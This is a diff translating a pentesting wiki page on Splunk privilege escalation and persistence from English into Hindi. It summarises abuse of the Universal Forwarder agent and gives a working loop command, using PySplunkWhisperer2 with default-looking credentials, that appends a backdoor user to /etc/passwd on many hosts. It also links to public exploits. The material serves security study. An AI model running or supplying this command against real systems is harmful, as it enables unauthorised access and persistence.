@@ -1,52 +1,50 @@
-# Splunk LPE and Persistence
+# Splunk LPE और स्थिरता
 
 {{#include ../../banners/hacktricks-training.md}}
 
-If **enumerating** a machine **internally** or **externally** you find **Splunk running** (port 8090), if you luckily know any **valid credentials** you can **abuse the Splunk service** to **execute a shell** as the user running Splunk. If root is running it, you can escalate privileges to root.
+यदि आप किसी मशीन को **आंतरिक** या **बाहरी** रूप से **सूचीबद्ध** करते हैं और आपको **Splunk चलाते हुए** (पोर्ट 8090) मिलता है, यदि आपको किसी **मान्य क्रेडेंशियल** के बारे में पता है, तो आप **Splunk सेवा का दुरुपयोग** करके **एक शेल** को उस उपयोगकर्ता के रूप में **निष्पादित** कर सकते हैं जो Splunk चला रहा है। यदि रूट इसे चला रहा है, तो आप रूट तक विशेषाधिकार बढ़ा सकते हैं।
 
-Also if you are **already root and the Splunk service is not listening only on localhost**, you can **steal** the **password** file **from** the Splunk service and **crack** the passwords, or **add new** credentials to it. And maintain persistence on the host.
+यदि आप **पहले से ही रूट हैं और Splunk सेवा केवल लोकलहोस्ट पर सुन नहीं रही है**, तो आप **Splunk सेवा से** **पासवर्ड** फ़ाइल **चुरा सकते हैं** और पासवर्ड को **क्रैक** कर सकते हैं, या इसमें **नए** क्रेडेंशियल **जोड़ सकते हैं**। और होस्ट पर स्थिरता बनाए रख सकते हैं।
 
-In the first image below you can see how a Splunkd web page looks like.
+नीचे पहले चित्र में आप देख सकते हैं कि एक Splunkd वेब पृष्ठ कैसा दिखता है।
 
-## Splunk Universal Forwarder Agent Exploit Summary
+## Splunk यूनिवर्सल फॉरवर्डर एजेंट एक्सप्लॉइट सारांश
 
-For further details check the post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). This is just a sumary:
+अधिक विवरण के लिए पोस्ट देखें [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). यह केवल एक सारांश है:
 
-**Exploit Overview:**
-An exploit targeting the Splunk Universal Forwarder Agent (UF) allows attackers with the agent password to execute arbitrary code on systems running the agent, potentially compromising an entire network.
+**एक्सप्लॉइट अवलोकन:**
+Splunk यूनिवर्सल फॉरवर्डर एजेंट (UF) को लक्षित करने वाला एक एक्सप्लॉइट हमलावरों को एजेंट पासवर्ड के साथ एजेंट चलाने वाले सिस्टम पर मनमाना कोड निष्पादित करने की अनुमति देता है, जिससे पूरे नेटवर्क का समझौता हो सकता है।
 
-**Key Points:**
+**मुख्य बिंदु:**
 
-- The UF agent does not validate incoming connections or the authenticity of code, making it vulnerable to unauthorized code execution.
-- Common password acquisition methods include locating them in network directories, file shares, or internal documentation.
-- Successful exploitation can lead to SYSTEM or root level access on compromised hosts, data exfiltration, and further network infiltration.
+- UF एजेंट आने वाले कनेक्शनों या कोड की प्रामाणिकता को मान्य नहीं करता है, जिससे यह अनधिकृत कोड निष्पादन के लिए संवेदनशील हो जाता है।
+- सामान्य पासवर्ड अधिग्रहण विधियों में उन्हें नेटवर्क निर्देशिकाओं, फ़ाइल शेयरों, या आंतरिक दस्तावेज़ों में ढूंढना शामिल है।
+- सफल दुरुपयोग से समझौता किए गए होस्ट पर SYSTEM या रूट स्तर की पहुंच, डेटा निकासी, और आगे के नेटवर्क में घुसपैठ हो सकती है।
 
-**Exploit Execution:**
+**एक्सप्लॉइट निष्पादन:**
 
-1. Attacker obtains the UF agent password.
-2. Utilizes the Splunk API to send commands or scripts to the agents.
-3. Possible actions include file extraction, user account manipulation, and system compromise.
+1. हमलावर UF एजेंट पासवर्ड प्राप्त करता है।
+2. एजेंटों को आदेश या स्क्रिप्ट भेजने के लिए Splunk API का उपयोग करता है।
+3. संभावित क्रियाओं में फ़ाइल निकासी, उपयोगकर्ता खाता हेरफेर, और सिस्टम का समझौता शामिल है।
 
-**Impact:**
+**प्रभाव:**
 
-- Full network compromise with SYSTEM/root level permissions on each host.
-- Potential for disabling logging to evade detection.
-- Installation of backdoors or ransomware.
+- प्रत्येक होस्ट पर SYSTEM/रूट स्तर की अनुमतियों के साथ पूर्ण नेटवर्क समझौता।
+- पहचान से बचने के लिए लॉगिंग को अक्षम करने की संभावना।
+- बैकडोर या रैनसमवेयर की स्थापना।
 
-**Example Command for Exploitation:**
-
+**दुरुपयोग के लिए उदाहरण आदेश:**
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
-
-**Usable public exploits:**
+**उपयोगी सार्वजनिक एक्सप्लॉइट:**
 
 - https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
 - https://www.exploit-db.com/exploits/46238
 - https://www.exploit-db.com/exploits/46487
 
-## Abusing Splunk Queries
+## Splunk क्वेरी का दुरुपयोग
 
-**For further details check the post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
+**अधिक जानकारी के लिए पोस्ट देखें [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
 
 {{#include ../../banners/hacktricks-training.md}}
